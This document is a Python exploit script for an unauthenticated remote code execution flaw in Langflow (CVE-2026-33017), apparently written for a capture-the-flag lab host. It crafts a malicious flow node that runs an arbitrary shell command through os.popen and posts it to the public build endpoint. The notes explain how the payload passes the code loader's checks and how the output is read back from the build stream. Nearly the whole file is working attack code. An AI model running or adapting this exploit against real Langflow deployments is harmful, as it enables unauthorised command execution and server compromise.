#!/usr/bin/env python3
"""
CVE-2026-33017 - Langflow unauthenticated RCE (Fireflow foothold).

Builds a one-node malicious flow and reads command output INLINE off the
build stream via ?event_delivery=direct - no reverse shell, no filesystem,
works entirely over 443 (outbound from the target is firewalled).

The payload must satisfy the loader before the exec sink:
  1. extract_class_name() scans the code for a class whose base name contains
     "Component" BEFORE anything runs.
  2. prepare_global_scope() exec()s ONLY definition statements (class/def/
     assign/import); a bare `raise` at module level is dropped.
So the payload + the output-raising live INSIDE a class body, and `Component`
is a local dummy class so no import is needed.

Usage:
  python3 fireflow_rce.py "<shell command>"

Fill in FLOW_ID from the /playground/<uuid> link on the main site.
"""
import sys, requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET  = "https://flow.fireflow.htb"
FLOW_ID = "<FLOW_ID>"          # UUIDv4 from the /playground/ link on the main page
M = "__OUT__"                  # brackets our output inside the build-error event


def build_code(py: str) -> str:
    body = "\n".join("    " + ln for ln in py.splitlines())
    return (
        "import os\n"
        "class Component:\n    pass\n"
        "class ExploitComponent(Component):\n"
        + body
        + f"\n    raise Exception('{M}' + str(_data) + '{M}')\n"
    )


def node(code: str) -> dict:
    return {"id": "x", "type": "genericNode", "position": {"x": 0, "y": 0}, "data": {
        "id": "x", "type": "ExploitComp", "node": {
            "template": {"code": {"type": "code", "required": True, "show": True,
                "multiline": True, "value": code, "name": "code", "password": False,
                "advanced": False, "dynamic": False}, "_type": "Component"},
            "description": "X", "base_classes": ["Data"], "display_name": "ExploitComp",
            "name": "ExploitComp", "frozen": False, "outputs": [{"types": ["Data"],
                "selected": "Data", "name": "o", "display_name": "O", "method": "r",
                "value": "__UNDEFINED__", "cache": True, "allows_loop": False,
                "tool_mode": False, "hidden": None, "required_inputs": None,
                "group_outputs": False}], "field_order": ["code"],
            "beta": False, "edited": False}}}


def run(code: str) -> None:
    url = f"{TARGET}/api/v1/build_public_tmp/{FLOW_ID}/flow?event_delivery=direct"
    body = {"data": {"nodes": [node(code)], "edges": []}, "inputs": None}
    buf = []
    with requests.post(url, json=body, cookies={"client_id": "x"},
                       verify=False, timeout=(10, 25), stream=True) as r:
        for raw in r.iter_lines():
            if not raw:
                continue
            line = raw.decode("utf-8", "replace")
            buf.append(line)
            if M in line:
                seg = line.split(M)
                if len(seg) >= 3:
                    print(seg[1])
                    return
    blob = "\n".join(buf)
    print(blob.split(M)[1] if M in blob else blob[:4000])


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    cmd = sys.argv[1].replace("\\", "\\\\").replace('"', '\\"')
    run(build_code(f'_data = os.popen("{cmd} 2>&1").read()\n'))
